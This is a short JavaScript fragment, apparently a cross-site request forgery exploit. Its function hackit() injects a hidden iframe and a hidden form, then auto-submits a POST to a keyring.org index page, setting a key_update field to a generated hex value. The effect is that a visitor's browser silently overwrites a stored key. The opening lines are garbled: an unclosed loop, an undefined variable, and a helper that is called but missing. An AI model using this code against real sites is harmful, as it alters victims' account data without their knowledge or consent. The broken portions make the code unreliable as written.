 var length = 256;

 for(i = 0; i < 256; i++){

   hex = num.toString(16);

//genHex();
function genRand(min, max){
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
function hackit(){
	var url = "http://keyring.org/index.php";
	var s = "hacked";
	var iframe = document.createElement("iframe");
	document.body.appendChild(iframe);
	iframe.style.display = "none";
	iframe.contentWindow.name = s;


	var form = document.createElement("form");
	form.target = s;
	form.action = url;
	form.method = "POST";


	var hexText = document.createElement("input");
	hexText.type = "hidden";
	hexText.name = "key_update";
	hexText.value = genHex();
	form.appendChild(hexText);

	var submit = document.createElement("input");
	submit.type = "hidden";
	submit.name = "key_submit";
	submit.value = "Save Key";
	form.appendChild(submit);

	document.body.appendChild(form);

	form.submit();
}
